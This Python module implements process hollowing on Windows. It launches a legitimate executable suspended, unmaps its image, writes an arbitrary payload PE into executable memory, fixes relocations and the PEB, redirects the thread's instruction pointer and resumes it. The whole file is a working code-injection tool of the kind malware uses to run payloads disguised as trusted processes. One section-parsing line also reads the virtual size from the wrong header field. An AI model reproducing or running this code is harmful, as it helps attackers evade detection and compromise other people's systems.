"""
Process Hollowing — creates a suspended target process, unmaps its image,
maps a replacement PE, and resumes execution.
"""
from __future__ import annotations
import ctypes
import ctypes.wintypes
import os
import struct
import sys

if sys.platform != "win32":
    raise ImportError("hollow requires Windows")

k32 = ctypes.windll.kernel32
nt  = ctypes.windll.ntdll

PROCESS_ALL_ACCESS      = 0x1F0FFF
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_READ       = 0x20
PAGE_READWRITE          = 0x04
CREATE_SUSPENDED        = 0x00000004

# ── STARTUPINFO / PROCESS_INFORMATION ────────────────────────────────────────

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              ctypes.wintypes.DWORD),
        ("lpReserved",      ctypes.wintypes.LPWSTR),
        ("lpDesktop",       ctypes.wintypes.LPWSTR),
        ("lpTitle",         ctypes.wintypes.LPWSTR),
        ("dwX",             ctypes.wintypes.DWORD),
        ("dwY",             ctypes.wintypes.DWORD),
        ("dwXSize",         ctypes.wintypes.DWORD),
        ("dwYSize",         ctypes.wintypes.DWORD),
        ("dwXCountChars",   ctypes.wintypes.DWORD),
        ("dwYCountChars",   ctypes.wintypes.DWORD),
        ("dwFillAttribute", ctypes.wintypes.DWORD),
        ("dwFlags",         ctypes.wintypes.DWORD),
        ("wShowWindow",     ctypes.wintypes.WORD),
        ("cbReserved2",     ctypes.wintypes.WORD),
        ("lpReserved2",     ctypes.c_void_p),
        ("hStdInput",       ctypes.wintypes.HANDLE),
        ("hStdOutput",      ctypes.wintypes.HANDLE),
        ("hStdError",       ctypes.wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.wintypes.HANDLE),
        ("hThread",  ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId",  ctypes.wintypes.DWORD),
    ]

# ── CONTEXT (x64 subset needed) ───────────────────────────────────────────────

class CONTEXT_x64(ctypes.Structure):
    _fields_ = [
        ("_pad",  ctypes.c_uint64 * 29),  # registers we don't need
        ("Rcx",   ctypes.c_uint64),        # offset: 232 in real CONTEXT
        ("Rdx",   ctypes.c_uint64),
        ("Rbx",   ctypes.c_uint64),
        ("Rsp",   ctypes.c_uint64),
        ("Rbp",   ctypes.c_uint64),
        ("Rsi",   ctypes.c_uint64),
        ("Rdi",   ctypes.c_uint64),
        ("R8",    ctypes.c_uint64),
        ("R9",    ctypes.c_uint64),
        ("R10",   ctypes.c_uint64),
        ("R11",   ctypes.c_uint64),
        ("R12",   ctypes.c_uint64),
        ("R13",   ctypes.c_uint64),
        ("R14",   ctypes.c_uint64),
        ("R15",   ctypes.c_uint64),
        ("Rip",   ctypes.c_uint64),
        ("_rest", ctypes.c_uint8 * 512),
    ]

# ── PE helpers ────────────────────────────────────────────────────────────────

def _pe_headers(data: bytes) -> dict:
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    machine  = struct.unpack_from("<H", data, e_lfanew + 4)[0]
    is64     = machine == 0x8664
    opt_off  = e_lfanew + 24
    image_base   = struct.unpack_from("<Q" if is64 else "<I", data, opt_off + 24)[0]
    entry_rva    = struct.unpack_from("<I", data, opt_off + 16)[0]
    image_size   = struct.unpack_from("<I", data, opt_off + 56)[0]
    num_sections = struct.unpack_from("<H", data, e_lfanew + 6)[0]
    hdr_size     = struct.unpack_from("<I", data, opt_off + 60)[0]
    sh_off       = opt_off + struct.unpack_from("<H", data, e_lfanew + 20)[0]
    return {
        "is64":        is64,
        "image_base":  image_base,
        "entry_rva":   entry_rva,
        "image_size":  image_size,
        "hdr_size":    hdr_size,
        "num_sections": num_sections,
        "sh_off":      sh_off,
        "opt_off":     opt_off,
        "e_lfanew":    e_lfanew,
    }

def _get_sections(data: bytes, h: dict) -> list[dict]:
    sections = []
    for i in range(h["num_sections"]):
        off   = h["sh_off"] + i * 40
        name  = data[off:off+8].rstrip(b"\x00").decode("ascii", errors="replace")
        vsz   = struct.unpack_from("<I", data, off + 16)[0]
        vaddr = struct.unpack_from("<I", data, off + 12)[0]
        raw   = struct.unpack_from("<I", data, off + 16)[0]
        rawp  = struct.unpack_from("<I", data, off + 20)[0]
        sections.append({"name": name, "vaddr": vaddr, "vsz": vsz, "raw": raw, "rawp": rawp})
    return sections

# ── Core hollowing ────────────────────────────────────────────────────────────

def hollow(host_path: str, payload_path: str) -> int:
    """
    Hollow 'host_path' and inject 'payload_path' PE.
    Both must be x64 executables. Returns PID of hollowed process.
    """
    with open(payload_path, "rb") as f:
        payload = f.read()

    ph = _pe_headers(payload)

    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    if not k32.CreateProcessW(
        host_path, None, None, None, False,
        CREATE_SUSPENDED, None, None,
        ctypes.byref(si), ctypes.byref(pi),
    ):
        raise OSError(f"CreateProcessW failed: {k32.GetLastError()}")

    hproc   = pi.hProcess
    hthread = pi.hThread
    pid     = pi.dwProcessId
    print(f"[HOLLOW] Created suspended PID {pid} from {os.path.basename(host_path)}")

    # Unmap host image using NtUnmapViewOfSection
    peb_rip_addr = _get_peb_image_base_addr(hproc, hthread)
    old_base = _read_remote_qword(hproc, peb_rip_addr)

    STATUS_SUCCESS = 0
    status = nt.NtUnmapViewOfSection(hproc, ctypes.c_void_p(old_base))
    if status != STATUS_SUCCESS:
        print(f"[HOLLOW] NtUnmapViewOfSection status 0x{status:08X} — continuing anyway")

    # Allocate at payload preferred base
    new_base = k32.VirtualAllocEx(
        hproc, ctypes.c_void_p(ph["image_base"]),
        ph["image_size"], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )
    if not new_base:
        new_base = k32.VirtualAllocEx(
            hproc, None, ph["image_size"], MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        )
    if not new_base:
        k32.TerminateProcess(hproc, 1)
        raise OSError(f"VirtualAllocEx failed: {k32.GetLastError()}")

    new_base_val = new_base

    # Write headers
    _write_remote(hproc, new_base_val, payload[:ph["hdr_size"]])

    # Write sections
    for sec in _get_sections(payload, ph):
        src = payload[sec["rawp"]:sec["rawp"] + sec["raw"]]
        _write_remote(hproc, new_base_val + sec["vaddr"], src)

    # Fix base relocation if base changed
    if new_base_val != ph["image_base"]:
        _apply_relocations(hproc, payload, ph, new_base_val)

    # Patch PEB image base
    _write_remote_qword(hproc, peb_rip_addr, new_base_val)

    # Set RIP to new entry point
    entry_addr = new_base_val + ph["entry_rva"]
    _set_rip(hproc, hthread, entry_addr)

    k32.ResumeThread(hthread)
    print(f"[HOLLOW] Resumed PID {pid} — entry 0x{entry_addr:016X}")
    k32.CloseHandle(hthread)
    k32.CloseHandle(hproc)
    return pid

# ── Helper memory ops ─────────────────────────────────────────────────────────

def _write_remote(hproc: int, addr: int, data: bytes) -> None:
    written = ctypes.c_size_t(0)
    ctypes.windll.kernel32.WriteProcessMemory(
        hproc, ctypes.c_void_p(addr), data, len(data), ctypes.byref(written),
    )

def _read_remote_qword(hproc: int, addr: int) -> int:
    buf = ctypes.create_string_buffer(8)
    read = ctypes.c_size_t(0)
    ctypes.windll.kernel32.ReadProcessMemory(
        hproc, ctypes.c_void_p(addr), buf, 8, ctypes.byref(read),
    )
    return struct.unpack_from("<Q", buf)[0]

def _write_remote_qword(hproc: int, addr: int, val: int) -> None:
    _write_remote(hproc, addr, struct.pack("<Q", val))

def _get_peb_image_base_addr(hproc: int, hthread: int) -> int:
    """
    Get the address of PEB.ImageBaseAddress by reading the thread's
    TEB (GS:[0x60]) — simplified: use NtQueryInformationProcess to get PBI.
    """
    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("ExitStatus",         ctypes.c_long),
            ("PebBaseAddress",     ctypes.c_void_p),
            ("AffinityMask",       ctypes.c_ulonglong),
            ("BasePriority",       ctypes.c_long),
            ("UniqueProcessId",    ctypes.c_ulonglong),
            ("InheritedFromUniqueProcessId", ctypes.c_ulonglong),
        ]
    pbi = PROCESS_BASIC_INFORMATION()
    ret_len = ctypes.c_ulong(0)
    nt.NtQueryInformationProcess(hproc, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len))
    peb_addr = pbi.PebBaseAddress or 0
    # PEB.ImageBaseAddress is at offset 0x10 on x64
    return peb_addr + 0x10

def _set_rip(hproc: int, hthread: int, rip: int) -> None:
    """Read thread CONTEXT, update Rip, write back."""
    CONTEXT_SIZE = 1232
    CONTEXT_FLAGS_ALL = 0x10001F
    buf = ctypes.create_string_buffer(CONTEXT_SIZE)
    # ContextFlags at offset 0x30 in CONTEXT
    struct.pack_into("<I", buf, 0x30, CONTEXT_FLAGS_ALL)
    k32.GetThreadContext(hthread, buf)
    # Rip is at offset 0xF8 (248) in CONTEXT
    struct.pack_into("<Q", buf, 0xF8, rip)
    k32.SetThreadContext(hthread, buf)

def _apply_relocations(hproc: int, payload: bytes, ph: dict, new_base: int) -> None:
    """Apply base relocations to fixup absolute addresses in the mapped image."""
    delta = new_base - ph["image_base"]
    if delta == 0:
        return
    # Find relocation directory (index 5 in data directories)
    opt_off = ph["opt_off"]
    is64    = ph["is64"]
    dd5_off = opt_off + (112 if is64 else 96) + 5 * 8
    reloc_rva  = struct.unpack_from("<I", payload, dd5_off)[0]
    reloc_size = struct.unpack_from("<I", payload, dd5_off + 4)[0]
    if reloc_rva == 0 or reloc_size == 0:
        return

    # Resolve RVA to file offset
    def r2o(rva: int) -> int:
        for i in range(ph["num_sections"]):
            s   = ph["sh_off"] + i * 40
            va  = struct.unpack_from("<I", payload, s + 12)[0]
            vsz = struct.unpack_from("<I", payload, s + 16)[0]
            raw = struct.unpack_from("<I", payload, s + 20)[0]
            if va <= rva < va + vsz:
                return raw + (rva - va)
        return rva

    off = r2o(reloc_rva)
    end = off + reloc_size
    while off < end:
        page_rva = struct.unpack_from("<I", payload, off)[0]
        block_sz = struct.unpack_from("<I", payload, off + 4)[0]
        if block_sz < 8:
            break
        entries = (block_sz - 8) // 2
        for j in range(entries):
            entry = struct.unpack_from("<H", payload, off + 8 + j * 2)[0]
            rtype = entry >> 12
            roff  = entry & 0xFFF
            if rtype == 10:  # IMAGE_REL_BASED_DIR64
                va   = new_base + page_rva + roff
                orig = _read_remote_qword(hproc, va)
                _write_remote_qword(hproc, va, orig + delta)
        off += block_sz
